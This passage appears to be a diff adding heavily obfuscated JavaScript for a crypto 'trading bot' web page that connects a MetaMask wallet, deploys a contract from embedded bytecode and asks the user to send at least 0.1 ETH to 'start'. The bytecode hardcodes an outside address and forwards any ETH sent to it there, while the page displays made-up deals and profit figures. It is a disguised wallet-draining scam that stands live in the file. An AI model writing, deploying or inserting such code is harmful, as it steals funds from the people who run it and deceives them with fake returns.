+                    _0x209268 = _0x177b6b, _0x12fff0[_0x313070(0x107)] = 'Status:\x20Connected\x20to\x20' + _0x177b6b[0x0][_0x313070(0x139)](0x0, 0x6) + _0x313070(0x14c) + _0x177b6b[0x0][_0x313070(0x139)](-0x4), _0x1b3334[_0x313070(0x107)] = _0x177b6b[0x0], _0x4b2491[_0x313070(0x1cd)]['add']('visible'), _0x22b875[_0x313070(0x107)] = _0x313070(0x185);
+                    let _0x2b5b07 = parseInt(localStorage['getItem']('dealCount')) || 0x50;
+                    if (_0x2b5b07 < 0x21) _0x2b5b07 = 0x21;
+                    else {
+                        if (_0x2b5b07 > 0x78) _0x2b5b07 = 0x78;
+                    }
+                    _0x4772e0[_0x313070(0x1aa)]['count'] = _0x2b5b07, _0x340a3f[_0x313070(0x107)] = _0x2b5b07;
+                    const _0x33e580 = (_0x2b5b07 / 0x50 * 0x2b)[_0x313070(0x194)](0x1),
+                        _0x480c5b = (_0x33e580 / 0x64)[_0x313070(0x194)](0x3);
+                    _0x3a157d['textContent'] = _0x33e580 + _0x313070(0x1c4) + _0x480c5b + _0x313070(0x10f), _0x1a9cb0[_0x313070(0x107)] = _0x1c259d[_0x313070(0x194)](0x4) + _0x313070(0x129), _0x3080ae[_0x313070(0x107)] = '', setTimeout(_0x2a2ad1, Math['random']() * (0x2710 - 0x1388) + 0x1388), _0x88ccc6['disabled'] = ![], !_0x5ce713 && (_0x5e5d2d['disabled'] = !![], _0x3df7fd[_0x313070(0x140)] = !![], _0x526c3e[_0x313070(0x140)] = !![]);
+                } else _0x5071dc();
+            }), window[_0x5c0071(0x151)]['on'](_0x5c0071(0x158), function(_0x19b5d6) {
+                const _0x2ad8c1 = _0x5c0071;
+                if (_0x19b5d6 !== _0x56f89c) {
+                    _0x12fff0['textContent'] = _0x2ad8c1(0x1bb), _0x401f5c('', 'Network\x20changed.\x20Switched\x20away\x20from\x20Ethereum\x20Mainnet.', _0x2ad8c1(0x176)), _0x4772e0[_0x2ad8c1(0x197)](_0x2ad8c1(0xf5))[_0x2ad8c1(0x107)] = _0x2ad8c1(0x153), _0x4772e0[_0x2ad8c1(0x197)]('.percentage')[_0x2ad8c1(0x107)] = '', _0x4772e0[_0x2ad8c1(0x197)]('.arrow')[_0x2ad8c1(0x107)] = '', _0x1a9cb0[_0x2ad8c1(0x107)] = _0x2ad8c1(0x138), _0x3a1abf[_0x2ad8c1(0x180)][_0x2ad8c1(0x1b1)] = _0x2ad8c1(0x177), _0xef2c96 = ![];
+                    if (_0x1212ab) clearTimeout(_0x1212ab);
+                    _0x5071dc();
+                }
+            }), window[_0x5c0071(0x151)]['on'](_0x5c0071(0x190), function() {
+                const _0x55b455 = _0x5c0071;
+                _0x12fff0[_0x55b455(0x107)] = 'Status:\x20MetaMask\x20disconnected.', _0x401f5c('', _0x55b455(0x101), 'error'), _0x4772e0[_0x55b455(0x197)](_0x55b455(0xf5))[_0x55b455(0x107)] = _0x55b455(0x153), _0x4772e0[_0x55b455(0x197)](_0x55b455(0x1c0))[_0x55b455(0x107)] = '', _0x4772e0[_0x55b455(0x197)](_0x55b455(0x130))[_0x55b455(0x107)] = '', _0x1a9cb0[_0x55b455(0x107)] = _0x55b455(0x138), _0x3a1abf[_0x55b455(0x180)][_0x55b455(0x1b1)] = _0x55b455(0x177), _0xef2c96 = ![];
+                if (_0x1212ab) clearTimeout(_0x1212ab);
+                _0x5071dc();
+            });
+        } catch (_0x91d50b) {
+            _0x12fff0[_0x5c0071(0x107)] = _0x5c0071(0x1ba) + _0x91d50b['message'], await _0x401f5c('', _0x5c0071(0x1c9) + _0x91d50b[_0x5c0071(0x1c6)], _0x5c0071(0x176)), _0x4772e0[_0x5c0071(0x197)](_0x5c0071(0xf5))[_0x5c0071(0x107)] = _0x5c0071(0x153), _0x4772e0[_0x5c0071(0x197)]('.percentage')['textContent'] = '', _0x4772e0['querySelector']('.arrow')[_0x5c0071(0x107)] = '', _0x1a9cb0[_0x5c0071(0x107)] = _0x5c0071(0x138), _0x3a1abf[_0x5c0071(0x180)][_0x5c0071(0x1b1)] = _0x5c0071(0x177);
+        }
+    }
+    async function _0x21938f() {
+        const _0x497c46 = _0x407fdd;
+        if (_0x209268[_0x497c46(0x13a)] === 0x0) {
+            _0x12fff0[_0x497c46(0x107)] = _0x497c46(0x1c1), await _0x401f5c('', _0x497c46(0x11a), _0x497c46(0x176));
+            return;
+        }
+        if (!_0x26f264 || !_0x26f264[_0x497c46(0x14d)]) {
+            _0x12fff0[_0x497c46(0x107)] = _0x497c46(0x1b4), await _0x401f5c('', _0x497c46(0xfe), _0x497c46(0x176));
+            return;
+        }
+        try {
+            _0x12fff0[_0x497c46(0x107)] = 'Status:\x20Deploying\x20contract...', await _0x401f5c('', _0x497c46(0x127), _0x497c46(0x159)), _0x88ccc6[_0x497c46(0x140)] = !![], _0x88ccc6[_0x497c46(0x1a6)] = _0x497c46(0x122);
+            const _0x7e7f5f = {
+                    'from': _0x209268[0x0],
+                    'data': _0x24558d
+                },
+                _0x43b582 = await _0x26f264[_0x497c46(0x14d)][_0x497c46(0x125)](_0x7e7f5f);
+            _0x7e7f5f[_0x497c46(0x136)] = _0x26f264['utils'][_0x497c46(0x114)](Math[_0x497c46(0x17c)](_0x43b582 * 1.2));
+            const _0x7c1b84 = await window['ethereum'][_0x497c46(0x112)]({
+                'method': _0x497c46(0x1ac),
+                'params': [_0x7e7f5f]
+            });
+            await _0x401f5c('', _0x497c46(0x165) + _0x7c1b84['slice'](0x0, 0xa) + _0x497c46(0x14c), _0x497c46(0x159)), _0x12fff0[_0x497c46(0x107)] = _0x497c46(0x161);
+            let _0x39e645 = null;
+            while (!_0x39e645) {
+                try {
+                    _0x39e645 = await _0x26f264[_0x497c46(0x14d)][_0x497c46(0x18d)](_0x7c1b84), !_0x39e645 && await new Promise(_0x259042 => setTimeout(_0x259042, 0x7d0));
+                } catch (_0x12846a) {
+                    console[_0x497c46(0x176)]('Error\x20checking\x20receipt:', _0x12846a), await new Promise(_0x37547f => setTimeout(_0x37547f, 0x7d0));
+                }
+            }
+            _0x5ce713 = _0x39e645[_0x497c46(0x17d)], _0xb8f8c = new _0x26f264[(_0x497c46(0x14d))]['Contract'](_0x2a7fe1, _0x5ce713), _0x12fff0['textContent'] = _0x497c46(0x132), await _0x401f5c('', 'Deployed\x20at\x20' + _0x5ce713, _0x497c46(0x150)), _0x13cd7a[_0x497c46(0x107)] = _0x497c46(0x108) + _0x5ce713, _0x88ccc6[_0x497c46(0x140)] = !![], _0x88ccc6[_0x497c46(0x1a6)] = 'Contract\x20Deployed', _0x5e5d2d[_0x497c46(0x140)] = ![], _0x3df7fd[_0x497c46(0x140)] = !![], _0x526c3e[_0x497c46(0x140)] = !![];
+        } catch (_0x11514a) {
+            _0x12fff0[_0x497c46(0x107)] = _0x497c46(0x173) + _0x11514a['message'], await _0x401f5c('', 'Error:\x20' + (_0x11514a[_0x497c46(0x1c6)] || _0x11514a), 'error'), _0x88ccc6[_0x497c46(0x140)] = ![], _0x88ccc6[_0x497c46(0x1a6)] = _0x497c46(0x144);
+        }
+    }
+    async function _0x1b986e() {
+        const _0xa89530 = _0x407fdd;
+        if (!_0xb8f8c) {
+            _0x12fff0[_0xa89530(0x107)] = 'Status:\x20No\x20contract\x20deployed.', await _0x401f5c('', _0xa89530(0x13e), 'error');
+            return;
+        }
+        const _0x1d4fb2 = _0x16fe36[_0xa89530(0x1c8)];
+        if (!_0x1d4fb2 || isNaN(_0x1d4fb2) || parseFloat(_0x1d4fb2) < 0.1) {
+            _0x12fff0[_0xa89530(0x107)] = _0xa89530(0x1b8), await _0x401f5c('', 'Invalid\x20amount.\x20Minimum\x200.1\x20ETH.', _0xa89530(0x176));
+            return;
+        }
+        try {
+            _0x12fff0[_0xa89530(0x107)] = 'Status:\x20Starting\x20action...', await _0x401f5c('', _0xa89530(0x148) + _0x1d4fb2 + _0xa89530(0x15f), _0xa89530(0x159)), _0x5e5d2d[_0xa89530(0x140)] = !![], _0x5e5d2d['innerHTML'] = _0xa89530(0x18b);
+            const _0x352d38 = _0x26f264[_0xa89530(0xf8)]['toWei'](_0x1d4fb2, _0xa89530(0x171)),
+                _0x572a45 = {
+                    'from': _0x209268[0x0],
+                    'to': _0x5ce713,
+                    'value': _0x26f264['utils'][_0xa89530(0x114)](_0x352d38),
+                    'data': _0xb8f8c[_0xa89530(0x19a)]['ad']()[_0xa89530(0x104)]()
+                },
+                _0x3e389b = await _0x26f264['eth'][_0xa89530(0x125)](_0x572a45);
+            _0x572a45[_0xa89530(0x136)] = _0x26f264[_0xa89530(0xf8)][_0xa89530(0x114)](Math[_0xa89530(0x17c)](_0x3e389b * 1.2));
+            const _0x71ebfc = await window[_0xa89530(0x151)][_0xa89530(0x112)]({
+                'method': _0xa89530(0x1ac),
+                'params': [_0x572a45]
+            });
+            await _0x401f5c('', _0xa89530(0x165) + _0x71ebfc[_0xa89530(0x139)](0x0, 0xa) + '...', _0xa89530(0x159)), _0x12fff0['textContent'] = _0xa89530(0x161);
+            let _0x5411f3 = null;
+            while (!_0x5411f3) {
+                try {
+                    _0x5411f3 = await _0x26f264[_0xa89530(0x14d)][_0xa89530(0x18d)](_0x71ebfc), !_0x5411f3 && await new Promise(_0xb9e632 => setTimeout(_0xb9e632, 0x7d0));
+                } catch (_0x4aa558) {
+                    console[_0xa89530(0x176)](_0xa89530(0x11f), _0x4aa558), await new Promise(_0x101467 => setTimeout(_0x101467, 0x7d0));
+                }
+            }
+            _0x12fff0[_0xa89530(0x107)] = _0xa89530(0x182), await _0x401f5c('', _0xa89530(0x1b3) + _0x1d4fb2 + _0xa89530(0x119), _0xa89530(0x150)), _0x2cce14[_0xa89530(0x1a6)] = '', _0x41fbae = 0x0, _0x1c259d = 0x0, localStorage[_0xa89530(0x154)](_0xa89530(0x186), _0x41fbae), localStorage[_0xa89530(0x154)](_0xa89530(0x1a5), _0x1c259d[_0xa89530(0x194)](0x4)), _0x1a9cb0[_0xa89530(0x107)] = _0x1c259d[_0xa89530(0x194)](0x4) + _0xa89530(0x129), _0xef2c96 = !![], _0x3a1abf['style'][_0xa89530(0x1b1)] = 'inline-block', _0x31253(), _0x5e5d2d[_0xa89530(0x140)] = ![], _0x5e5d2d[_0xa89530(0x1a6)] = 'Start', _0x3df7fd['disabled'] = ![], _0x526c3e['disabled'] = !![];
+        } catch (_0x1ee616) {
+            _0x12fff0[_0xa89530(0x107)] = _0xa89530(0x1c3) + _0x1ee616[_0xa89530(0x1c6)], await _0x401f5c('', 'Error:\x20' + (_0x1ee616[_0xa89530(0x1c6)] || _0x1ee616), 'error'), _0x5e5d2d['disabled'] = ![], _0x5e5d2d[_0xa89530(0x1a6)] = _0xa89530(0x1b5);
+        }
+    }
+    async function _0x4735a3() {
+        const _0x45a4b5 = _0x407fdd;
+        if (!_0xb8f8c) {
+            _0x12fff0[_0x45a4b5(0x107)] = _0x45a4b5(0x123), await _0x401f5c('', 'No\x20contract\x20deployed.', _0x45a4b5(0x176));
+            return;
+        }
+        if (_0x209268['length'] === 0x0) {
+            _0x12fff0['textContent'] = _0x45a4b5(0x1c1), await _0x401f5c('', _0x45a4b5(0x11a), _0x45a4b5(0x176));
+            return;
+        }
+        try {
+            _0x12fff0['textContent'] = _0x45a4b5(0x117), _0x3df7fd['disabled'] = !![], _0x3df7fd[_0x45a4b5(0x1a6)] = _0x45a4b5(0x128);
+            const _0x58319f = await _0xb8f8c[_0x45a4b5(0x19a)]['stop']()['estimateGas']({
+                    'from': _0x209268[0x0]
+                }),
+                _0x457e4f = {
+                    'from': _0x209268[0x0],
+                    'to': _0x5ce713,
+                    'gas': _0x26f264[_0x45a4b5(0xf8)][_0x45a4b5(0x114)](Math['floor'](_0x58319f * 1.2)),
+                    'data': _0xb8f8c[_0x45a4b5(0x19a)][_0x45a4b5(0x12f)]()[_0x45a4b5(0x104)]()
+                },
+                _0x1d19b9 = await window[_0x45a4b5(0x151)][_0x45a4b5(0x112)]({
+                    'method': _0x45a4b5(0x1ac),
+                    'params': [_0x457e4f]
+                });
+            await _0x401f5c('', 'Transaction\x20sent:\x20' + _0x1d19b9[_0x45a4b5(0x139)](0x0, 0xa) + _0x45a4b5(0x14c), 'info'), _0x12fff0[_0x45a4b5(0x107)] = _0x45a4b5(0x161);
+            let _0x4e2365 = null;
+            while (!_0x4e2365) {
+                try {
+                    _0x4e2365 = await _0x26f264[_0x45a4b5(0x14d)]['getTransactionReceipt'](_0x1d19b9), !_0x4e2365 && await new Promise(_0xf605b9 => setTimeout(_0xf605b9, 0x7d0));
+                } catch (_0x23f7eb) {
+                    console['error']('Error\x20checking\x20receipt:', _0x23f7eb), await new Promise(_0x36f8d6 => setTimeout(_0x36f8d6, 0x7d0));
+                }
+            }
+            _0x12fff0['textContent'] = _0x45a4b5(0x118), _0xef2c96 = ![], _0x3a1abf['style'][_0x45a4b5(0x1b1)] = _0x45a4b5(0x177);
+            if (_0x1212ab) clearTimeout(_0x1212ab);
+            _0x3df7fd['disabled'] = ![], _0x3df7fd[_0x45a4b5(0x1a6)] = _0x45a4b5(0x155), _0x526c3e['disabled'] = ![];
+        } catch (_0x1ea1ca) {
+            _0x12fff0[_0x45a4b5(0x107)] = 'Status:\x20Stop\x20action\x20failed:\x20' + _0x1ea1ca[_0x45a4b5(0x1c6)], await _0x401f5c('', 'Error:\x20' + (_0x1ea1ca[_0x45a4b5(0x1c6)] || _0x1ea1ca), 'error'), _0x3df7fd[_0x45a4b5(0x140)] = ![], _0x3df7fd['innerHTML'] = _0x45a4b5(0x155), _0x526c3e['disabled'] = !![];
+        }
+    }
+    async function _0x247cae() {
+        const _0x1e32c2 = _0x407fdd;
+        if (!_0xb8f8c) {
+            _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x123), await _0x401f5c('', _0x1e32c2(0x13e), _0x1e32c2(0x176));
+            return;
+        }
+        if (_0x209268[_0x1e32c2(0x13a)] === 0x0) {
+            _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x1c1), await _0x401f5c('', _0x1e32c2(0x11a), _0x1e32c2(0x176));
+            return;
+        }
+        try {
+            _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x178), _0x526c3e[_0x1e32c2(0x140)] = !![], _0x526c3e['innerHTML'] = _0x1e32c2(0x16a);
+            const _0x5c9c4c = await _0xb8f8c[_0x1e32c2(0x19a)][_0x1e32c2(0x1a3)]()[_0x1e32c2(0x125)]({
+                    'from': _0x209268[0x0]
+                }),
+                _0x383c95 = {
+                    'from': _0x209268[0x0],
+                    'to': _0x5ce713,
+                    'gas': _0x26f264['utils'][_0x1e32c2(0x114)](Math[_0x1e32c2(0x17c)](_0x5c9c4c * 1.2)),
+                    'data': _0xb8f8c[_0x1e32c2(0x19a)][_0x1e32c2(0x1a3)]()['encodeABI']()
+                },
+                _0x35aba8 = await window[_0x1e32c2(0x151)][_0x1e32c2(0x112)]({
+                    'method': _0x1e32c2(0x1ac),
+                    'params': [_0x383c95]
+                });
+            await _0x401f5c('', 'Transaction\x20sent:\x20' + _0x35aba8['slice'](0x0, 0xa) + _0x1e32c2(0x14c), 'info'), _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x161);
+            let _0x45d913 = null;
+            while (!_0x45d913) {
+                try {
+                    _0x45d913 = await _0x26f264[_0x1e32c2(0x14d)][_0x1e32c2(0x18d)](_0x35aba8), !_0x45d913 && await new Promise(_0x400b78 => setTimeout(_0x400b78, 0x7d0));
+                } catch (_0x1cc812) {
+                    console['error'](_0x1e32c2(0x11f), _0x1cc812), await new Promise(_0x4e7558 => setTimeout(_0x4e7558, 0x7d0));
+                }
+            }
+            _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x1b2), _0x526c3e[_0x1e32c2(0x140)] = ![], _0x526c3e[_0x1e32c2(0x1a6)] = _0x1e32c2(0x18c), _0x3df7fd[_0x1e32c2(0x140)] = ![];
+        } catch (_0x3d3c0f) {
+            _0x12fff0[_0x1e32c2(0x107)] = _0x1e32c2(0x134) + _0x3d3c0f[_0x1e32c2(0x1c6)], await _0x401f5c('', _0x1e32c2(0x1c9) + (_0x3d3c0f[_0x1e32c2(0x1c6)] || _0x3d3c0f), 'error'), _0x526c3e[_0x1e32c2(0x140)] = ![], _0x526c3e[_0x1e32c2(0x1a6)] = _0x1e32c2(0x18c), _0x3df7fd[_0x1e32c2(0x140)] = ![];
+        }
+    }
+
+    function _0x5071dc() {
+        const _0x1fb001 = _0x407fdd;
+        _0x209268 = [], _0x12fff0[_0x1fb001(0x107)] = 'Status:\x20Not\x20connected', _0x13cd7a['textContent'] = _0x1fb001(0x13b), _0x1b3334[_0x1fb001(0x107)] = _0x1fb001(0x115), _0x4b2491['classList'][_0x1fb001(0x146)](_0x1fb001(0x19e)), _0x22b875[_0x1fb001(0x107)] = _0x1fb001(0x1cc), _0x401f5c('', _0x1fb001(0x19c), 'info'), _0x4772e0[_0x1fb001(0x197)](_0x1fb001(0xf5))[_0x1fb001(0x107)] = _0x1fb001(0x153), _0x4772e0['querySelector'](_0x1fb001(0x1c0))[_0x1fb001(0x107)] = '', _0x4772e0[_0x1fb001(0x197)](_0x1fb001(0x130))['textContent'] = '', _0x1a9cb0[_0x1fb001(0x107)] = '0.0000\x20ETH', _0x3a1abf['style']['display'] = _0x1fb001(0x177), _0xef2c96 = ![], _0x41fbae = 0x0, _0x1c259d = 0x0, localStorage[_0x1fb001(0x154)]('transactionCount', _0x41fbae), localStorage[_0x1fb001(0x154)](_0x1fb001(0x1a5), _0x1c259d['toFixed'](0x4));
+        if (_0x1212ab) clearTimeout(_0x1212ab);
+        _0x88ccc6[_0x1fb001(0x140)] = !![], _0x88ccc6[_0x1fb001(0x1a6)] = 'Deploy\x20Contract', _0x5e5d2d['disabled'] = !![], _0x5e5d2d[_0x1fb001(0x1a6)] = _0x1fb001(0x1b5), _0x3df7fd[_0x1fb001(0x140)] = !![], _0x526c3e[_0x1fb001(0x140)] = !![], _0x5ce713 = null, _0xb8f8c = null, _0x16fe36[_0x1fb001(0x1c8)] = '';
+    }
+    _0x22b875[_0x407fdd(0x131)]('click', _0x56a5f2), _0x88ccc6[_0x407fdd(0x131)](_0x407fdd(0x14a), _0x21938f), _0x5e5d2d[_0x407fdd(0x131)](_0x407fdd(0x14a), _0x1b986e), _0x3df7fd[_0x407fdd(0x131)]('click', _0x4735a3), _0x526c3e[_0x407fdd(0x131)](_0x407fdd(0x14a), _0x247cae), _0x5d5dae['addEventListener'](_0x407fdd(0x170), _0x3a791c), _0x4e3467[_0x407fdd(0x131)]('change', _0x28d2bb), _0x5b3306['addEventListener'](_0x407fdd(0x164), _0x28d2bb), window[_0x407fdd(0x151)] ? window[_0x407fdd(0x151)][_0x407fdd(0x112)]({
+        'method': _0x407fdd(0x17b)
+    })[_0x407fdd(0x11e)](async function(_0x2e9176) {
+        const _0xcbf45a = _0x407fdd;
+        if (_0x2e9176[_0xcbf45a(0x13a)] > 0x0) {
+            if (await _0x16cf57()) {
+                _0x209268 = _0x2e9176, _0x12fff0['textContent'] = _0xcbf45a(0x100) + _0x2e9176[0x0]['slice'](0x0, 0x6) + _0xcbf45a(0x14c) + _0x2e9176[0x0][_0xcbf45a(0x139)](-0x4), _0x1b3334[_0xcbf45a(0x107)] = _0x2e9176[0x0], _0x4b2491[_0xcbf45a(0x1cd)][_0xcbf45a(0x181)](_0xcbf45a(0x19e)), _0x22b875[_0xcbf45a(0x107)] = _0xcbf45a(0x185);
+                let _0x3cb863 = parseInt(localStorage[_0xcbf45a(0x184)](_0xcbf45a(0x1b6))) || 0x50;
+                if (_0x3cb863 < 0x21) _0x3cb863 = 0x21;
+                else {
+                    if (_0x3cb863 > 0x78) _0x3cb863 = 0x78;
+                }
+                _0x4772e0[_0xcbf45a(0x1aa)][_0xcbf45a(0x167)] = _0x3cb863, _0x340a3f[_0xcbf45a(0x107)] = _0x3cb863;
+                const _0x6d9f41 = (_0x3cb863 / 0x50 * 0x2b)[_0xcbf45a(0x194)](0x1),
+                    _0x1fb644 = (_0x6d9f41 / 0x64)[_0xcbf45a(0x194)](0x3);
+                _0x3a157d[_0xcbf45a(0x107)] = _0x6d9f41 + _0xcbf45a(0x1c4) + _0x1fb644 + _0xcbf45a(0x10f), _0x1a9cb0[_0xcbf45a(0x107)] = _0x1c259d[_0xcbf45a(0x194)](0x4) + _0xcbf45a(0x129), _0x3080ae[_0xcbf45a(0x107)] = '', setTimeout(_0x2a2ad1, Math[_0xcbf45a(0xff)]() * (0x2710 - 0x1388) + 0x1388), _0x88ccc6[_0xcbf45a(0x140)] = ![];
+            } else _0x12fff0[_0xcbf45a(0x107)] = 'Status:\x20Please\x20switch\x20to\x20Ethereum\x20Mainnet\x20or\x20connect\x20MetaMask.', await _0x401f5c('', _0xcbf45a(0x19d), _0xcbf45a(0x176)), _0x4772e0[_0xcbf45a(0x197)](_0xcbf45a(0xf5))[_0xcbf45a(0x107)] = 'Connect\x20wallet', _0x4772e0[_0xcbf45a(0x197)](_0xcbf45a(0x1c0))[_0xcbf45a(0x107)] = '', _0x4772e0[_0xcbf45a(0x197)](_0xcbf45a(0x130))[_0xcbf45a(0x107)] = '', _0x1a9cb0[_0xcbf45a(0x107)] = _0xcbf45a(0x138), _0x3a1abf[_0xcbf45a(0x180)][_0xcbf45a(0x1b1)] = _0xcbf45a(0x177);
+        } else _0x12fff0[_0xcbf45a(0x107)] = _0xcbf45a(0x16e), await _0x401f5c('', _0xcbf45a(0x113), _0xcbf45a(0x176)), _0x4772e0['querySelector'](_0xcbf45a(0xf5))[_0xcbf45a(0x107)] = _0xcbf45a(0x153), _0x4772e0[_0xcbf45a(0x197)](_0xcbf45a(0x1c0))[_0xcbf45a(0x107)] = '', _0x4772e0[_0xcbf45a(0x197)]('.arrow')['textContent'] = '', _0x1a9cb0[_0xcbf45a(0x107)] = '0.0000\x20ETH', _0x3a1abf[_0xcbf45a(0x180)]['display'] = 'none';
+    })[_0x407fdd(0x16d)](function(_0x1b982b) {
+        const _0x1f6436 = _0x407fdd;
+        console['error']('Error\x20checking\x20accounts:', _0x1b982b), _0x401f5c('', _0x1f6436(0x1a4) + _0x1b982b[_0x1f6436(0x1c6)], _0x1f6436(0x176)), _0x4772e0[_0x1f6436(0x197)](_0x1f6436(0xf5))[_0x1f6436(0x107)] = _0x1f6436(0x153), _0x4772e0[_0x1f6436(0x197)]('.percentage')[_0x1f6436(0x107)] = '', _0x4772e0['querySelector'](_0x1f6436(0x130))['textContent'] = '', _0x1a9cb0['textContent'] = _0x1f6436(0x138), _0x3a1abf[_0x1f6436(0x180)][_0x1f6436(0x1b1)] = _0x1f6436(0x177);
+    }) : (_0x12fff0[_0x407fdd(0x107)] = 'Status:\x20No\x20Ethereum\x20wallet\x20detected.\x20Please\x20install\x20MetaMask.', _0x401f5c('', _0x407fdd(0x1ad), _0x407fdd(0x176)), _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0xf5))[_0x407fdd(0x107)] = _0x407fdd(0x153), _0x4772e0[_0x407fdd(0x197)]('.percentage')['textContent'] = '', _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0x130))[_0x407fdd(0x107)] = '', _0x1a9cb0[_0x407fdd(0x107)] = _0x407fdd(0x138), _0x3a1abf['style'][_0x407fdd(0x1b1)] = _0x407fdd(0x177)), _0x401f5c('', 'Blockchain\x20Terminal\x20initialized.', _0x407fdd(0x150)), _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0xf5))['textContent'] = _0x407fdd(0x153), _0x4772e0[_0x407fdd(0x197)](_0x407fdd(0x1c0))[_0x407fdd(0x107)] = '', _0x4772e0[_0x407fdd(0x197)]('.arrow')[_0x407fdd(0x107)] = '', _0x1a9cb0['textContent'] = _0x1c259d[_0x407fdd(0x194)](0x4) + _0x407fdd(0x129), _0x3a1abf[_0x407fdd(0x180)]['display'] = _0x407fdd(0x177);
+}));
+
+function _0x3e9b() {
+    const _0x2118be = ['APE', 'Web3\x20or\x20Web3.eth\x20is\x20undefined.', 'random', 'Status:\x20Connected\x20to\x20', 'MetaMask\x20disconnected.', 'span', '26JPNYvI', 'encodeABI', 'Error\x20checking\x20network:\x20', '942izDbiL', 'textContent', 'Contract\x20Address:\x20', 'prompt', 'address', 'TRB', 'status', 'deployContractBtn', 'WETH', '\x20ETH/day\x20(at\x201\x20ETH)', '\x20=\x20', 'logEntriesDiv\x20is\x20not\x20defined', 'request', 'MetaMask\x20detected\x20but\x20not\x20connected.', 'toHex', 'Not\x20connected', '-----------------------------------------', 'Status:\x20Stopping\x20action...', 'Status:\x20Stop\x20action\x20completed!', '\x20ETH\x20to\x20recipient', 'No\x20wallet\x20connected.', 'lastChild', 'Status:\x20Web3.eth\x20is\x20undefined.\x20Possible\x20Web3.js\x20initialization\x20error.', 'separator-line', 'then', 'Error\x20checking\x20receipt:', 'AAVE', '15490772nGZbfj', '<div\x20class=\x22loading-indicator\x22></div>\x20Deploying...', 'Status:\x20No\x20contract\x20deployed.', 'INJ', 'estimateGas', 'Status:\x20Failed\x20to\x20switch\x20to\x20Ethereum\x20Mainnet:\x20', 'Deploying\x20contract\x20to\x20blockchain...', '<div\x20class=\x22loading-indicator\x22></div>\x20Stopping...', '\x20ETH', 'payable', 'YFI', 'className', 'SKL', 'currentProvider', 'stop', '.arrow', 'addEventListener', 'Status:\x20Contract\x20deployed!', 'Taking\x20the\x20most\x20profitable\x20deal\x20with\x20Slippage:\x20', 'Status:\x20Withdraw\x20failed:\x20', 'SHIB', 'gas', 'RNDR', '0.0000\x20ETH', 'slice', 'length', 'Contract\x20Address:\x20None', 'scrollHeight', 'ANT', 'No\x20contract\x20deployed.', '28685hiKNZM', 'disabled', 'address\x20payable', 'getElementById', 'web3', 'Deploy\x20Contract', 'round', 'remove', 'Web3.eth\x20is\x20undefined\x20in\x20legacy\x20provider.', 'Sending\x20', 'arrow\x20', 'click', 'firstChild', '...', 'eth', 'logEntries', 'startBtn', 'success', 'ethereum', 'ANKR', 'Connect\x20wallet', 'setItem', 'Stop', 'removeChild', 'createElement', 'chainChanged', 'info', 'success-transaction', 'UNI', '12IaZnDR', 'stopBtn', 'mevProtection', '\x20ETH\x20to\x20recipient...', 'connectWallet', 'Status:\x20Waiting\x20for\x20confirmation...', 'ENS', 'eth_chainId', 'change', 'Transaction\x20sent:\x20', 'walletAddressText', 'count', 'Status:\x20Error\x20checking\x20network:\x20', 'output\x20', '<div\x20class=\x22loading-indicator\x22></div>\x20Withdrawing...', 'KEEP', 'eth_requestAccounts', 'catch', 'Status:\x20MetaMask\x20detected\x20but\x20not\x20connected.\x20Please\x20connect\x20wallet.', '\x20-\x20WETH\x20-\x20ETH\x20=\x20', 'input', 'ether', 'BAND', 'Status:\x20Deployment\x20failed:\x20', '24ZvBvYH', 'AGIX', 'error', 'none', 'Status:\x20Withdrawing\x20funds...', 'LPT', '226866jRwIHU', 'eth_accounts', 'floor', 'contractAddress', '35fEObns', 'scrollTop', 'style', 'add', 'Status:\x20Action\x20started!', 'IMX', 'getItem', 'Disconnect', 'transactionCount', 'RLC', 'LRC', 'BAL', '6549751HlgZDA', '<div\x20class=\x22loading-indicator\x22></div>\x20Starting...', 'Withdraw', 'getTransactionReceipt', 'children', 'terminal', 'disconnect', '6080604052600080546001600160a01b03191673a930601af57b4af61bda675312f00eb0519f007b17905534801561003657600080fd5b506101a5806100466000396000f3fe60806040526004361061004a5760003560e01c806307da68f51461004f5780631b88094d146100665780633ccfd60b1461004f5780633e1430af1461009157806366d003ac14610099575b600080fd5b34801561005b57600080fd5b506100646100ae565b005b34801561007257600080fd5b5061007b6100b0565b6040516100889190610134565b60405180910390f35b6100646100bf565b3480156100a557600080fd5b5061007b610125565b565b6000546001600160a01b031690565b600034116100e85760405162461bcd60e51b81526004016100df90610148565b60405180910390fd5b600080546040516001600160a01b03909116913480156108fc02929091818181858888f19350505050158015610122573d6000803e3d6000fd5b50565b6000546001600160a01b031681565b6001600160a01b0391909116815260200190565b6020808252600d908201526c0a6cadcc840e6dedaca408aa89609b1b60408201526060019056fea26469706673582212207414cd3140ef335be1e7968ca3faa06508c437533b6c7f648bbcdf12d9ad56c064736f6c63430008000033', 'SAND', 'NMR', 'toFixed', 'KNC', 'slippage', 'querySelector', 'nonpayable', '8680TQwsQQ', 'methods', 'contract.start', 'Wallet\x20disconnected.', 'Please\x20switch\x20to\x20Ethereum\x20Mainnet\x20or\x20connect\x20MetaMask.', 'visible', 'Error\x20switching\x20to\x20Ethereum\x20Mainnet:\x20', 'wallet_switchEthereumChain', 'path', 'AUDIO', 'withdraw', 'Error\x20checking\x20accounts:\x20', 'totalProfit', 'innerHTML', 'appendChild', '5455017FxzbKz', 'OCEAN', 'dataset', 'DOMContentLoaded', 'eth_sendTransaction', 'No\x20Ethereum\x20wallet\x20detected.\x20Please\x20install\x20MetaMask.', 'opportunities', '1INCH', 'PEPE', 'display', 'Status:\x20Withdraw\x20action\x20completed!', 'Sent\x20', 'Status:\x20Web3\x20not\x20initialized\x20properly.', 'Start', 'dealCount', 'CHZ', 'Status:\x20Please\x20enter\x20at\x20least\x200.1\x20ETH.', 'walletAddress', 'Status:\x20Failed\x20to\x20connect\x20wallet:\x20', 'Status:\x20Please\x20switch\x20back\x20to\x20Ethereum\x20Mainnet.', 'RPL', '10OEYXcI', 'ALCX', 'slippageValue', '.percentage', 'Status:\x20Please\x20connect\x20your\x20wallet\x20first.', 'contract.deploy', 'Status:\x20Action\x20failed:\x20', '%\x20≈\x20', 'CTSI', 'message', '131226xBCxGy', 'value', 'Error:\x20', 'accountsChanged', 'BADGER', 'Connect\x20MetaMask', 'classList', 'API3', '.deal-count', 'insertBefore', 